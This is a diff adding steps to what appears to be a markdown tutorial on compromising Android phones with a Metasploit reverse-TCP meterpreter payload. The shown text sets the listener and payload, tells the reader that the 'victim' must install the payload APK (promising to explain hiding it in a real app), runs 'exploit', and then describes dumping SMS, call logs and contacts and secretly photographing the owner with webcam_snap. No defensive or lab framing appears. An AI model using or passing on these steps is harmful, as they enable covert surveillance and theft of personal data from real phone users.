@@ -28,3 +28,16 @@ LHOST is your ip address and LPORT is 4444.you can make it by `set LHOST <your I
 then we have to set our payload by `set payload android/meterpreter/reverse_tcp`
 
 ![set payload](https://cdn1.imggmi.com/uploads/2019/10/28/05a5525e2835ad7416f1d6265655b70c-full.png)
+
+so, now the victim has to instsall our payload apk and i'll explain how can you inject your payload in a real application and after that you have to execute `exploit` command.
+
+![exploit](https://cdn1.imggmi.com/uploads/2019/11/2/c43af926d99e1baa095156707dc3aae8-full.png)
+
+now when victim open the payload(Application) you have to see sth like this:
+
+![meterpreter](https://cdn1.imggmi.com/uploads/2019/11/2/3f2a78bd9dd6c9625c8a2c07e45b714c-full.png)
+
+the meterpreter is now open so now we can do evrything we want like: dumping sms, dumping calls, dumping contacts and etc.
+let's test webcam, you can take a picture of backside camera by typing: `webcam_snap` and from second camera(depends on the phone) by typing: `webcam_snap -i 2` also there is lots of options that you can read about them by typing `help`
+
+![help](https://cdn1.imggmi.com/uploads/2019/11/2/0519ab98d62441d5c84a739beee1bb0b-full.png)
